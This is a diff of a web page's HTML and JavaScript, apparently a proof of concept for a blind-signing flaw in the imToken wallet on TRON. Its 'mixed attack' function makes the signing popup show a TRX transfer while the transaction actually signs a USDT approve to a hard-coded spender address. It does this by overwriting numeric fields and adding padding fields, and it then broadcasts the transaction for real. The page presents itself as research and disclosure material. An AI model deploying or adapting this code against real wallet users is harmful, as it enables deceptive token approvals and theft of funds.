@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>imToken TRON 所见非所签漏洞验证（完整版）</title>
+  <title>imToken TRON 所见非所签漏洞验证（研究与披露）</title>
   <style>
     :root { --bg:#0b0f14; --card:#131a22; --border:#253040; --text:#e1e6ed; --text2:#8899aa; --red:#f04343; --orange:#e6a23c; --green:#2ecc71; --blue:#4d94ff; }
     * { margin:0; padding:0; box-sizing:border-box; }
@@ -28,6 +28,7 @@
     .log-warn { color:var(--orange); }
     .info-box { background:rgba(77,148,255,0.08); border:1px solid rgba(77,148,255,0.2); border-radius:8px; padding:10px; font-size:12px; color:var(--blue); margin-top:10px; }
     .warning-box { background:rgba(240,67,67,0.08); border:1px solid rgba(240,67,67,0.2); border-radius:8px; padding:10px; font-size:12px; color:var(--red); margin-top:10px; }
+    .note { font-size:12px; color:var(--text2); }
   </style>
 </head>
 <body>
@@ -40,8 +41,10 @@
       ③ <span class="highlight-red">混合攻击</span> – 弹窗显示 TRX 转账，实际签署 USDT approve<br>
       <br>
       攻击核心：利用 <code>raw_data</code> 与 <code>raw_data_hex</code> 分离 + 数字字段覆盖<br>
-      <span class="highlight-red">当前最新版 imToken 会校验一致性，混合交易报错，无法上链</span><br>
-      可尝试在旧版 imToken (如 Android 2.13.x) 中复现，或作为漏洞报告的技术演示。
+      <span class="note">⚠️ 是否受影响取决于具体版本和平台，不保证所有 imToken 版本均可复现。</span>
+    </div>
+    <div class="warning-box">
+      本页面会真实签名并广播交易，请务必使用无资产测试钱包。
     </div>
   </div>
 
@@ -66,7 +69,7 @@
     <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
     <div class="row"><span class="label">变化</span><span class="value" id="allowanceChange">--</span></div>
     <div class="info-box">
-      若混合攻击后授权从 0 变为 1 USDT，则漏洞验证成功（需配合弹窗截图与 txid）。
+      若混合攻击后授权从 0 变为 1 USDT，则漏洞验证成功（需结合弹窗截图和 txid 作为完整证据）。
     </div>
   </div>
 
@@ -74,13 +77,13 @@
     <div class="card-header"><span class="dot orange"></span> 运行日志</div>
     <div class="log-box" id="logContainer">等待操作…</div>
   </div>
-  <div style="font-size:11px; color:var(--text2); text-align:center;">仅供安全研究 · 使用无资产测试钱包</div>
+  <div style="font-size:11px; color:var(--text2); text-align:center;">仅供安全研究与负责任披露</div>
 
 <script>
 (function() {
   const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
   const SPENDER = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
-  const APPROVE_AMOUNT = '1000000';
+  const APPROVE_AMOUNT = '1000000'; // 1 USDT
   const TRON_API = 'https://api.trongrid.io';
 
   let walletAddr = '';
@@ -125,7 +128,7 @@
     await refreshAllowanceUI(true);
   }
 
-  // allowance 查询
+  // Allowance 查询
   async function queryAllowance(owner, spender) {
     try {
       const ownerHex = window.tronWeb.address.toHex(owner);
@@ -218,7 +221,7 @@
     } catch(e) { log('构造失败: '+(e.message||e),'error'); }
   }
 
-  // 3. 混合攻击
+  // 3. 混合攻击（与文档描述一致）
   async function mixedTx() {
     if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪','error'); return; }
     log('构造混合攻击交易…','warn');
@@ -239,21 +242,21 @@
         value: { amount:100000, to_address:SPENDER, owner_address:walletAddr }
       };
 
-      // 数字字段覆盖 + 填充字段
+      // 数字字段覆盖（文档所述方式） + 填充字段（未经当前节点验证）
       const contractObj = {
         type: 'TransferContract',
         parameter: fakeParam,
+        // 填充字段，用于尝试操纵 HashMap 遍历顺序（未经当前节点验证）
         _pad1:'x',_pad2:'y',_pad3:{},_pad4:[],_pad5:0,
         _pad6:null,_pad7:'',_pad8:false,_pad9:0xcafe,_pad10:'padding',
-        '1': 31,           // TriggerSmartContract
-        '2': realParam     // 真实 approve Any 参数
+        '1': 'TriggerSmartContract',    // 对应文档：使用字符串而非数值
+        '2': realParam                  // 真实 approve Any 参数
       };
 
       transaction.raw_data.contract[0] = contractObj;
 
-      log('✔ 数字字段已注入 ("1":31, "2":realParam)','success');
-      log('raw_data_hex 包含 approve: '+transaction.raw_data_hex.includes('095ea7b3'),'success');
-      log('⚠️ 当前版本很可能拦截，若失败可尝试旧版 imToken','warn');
+      log('✔ 已构造数字字段覆盖，尚未验证节点解析结果','success');
+      log('raw_data_hex 中包含 095ea7b3 (仅检测到选择器)','success');
 
       const ok = await sendTx(transaction, '混合攻击 (approve)');
       if (ok) setTimeout(()=>refreshAllowanceUI(false), 12000);
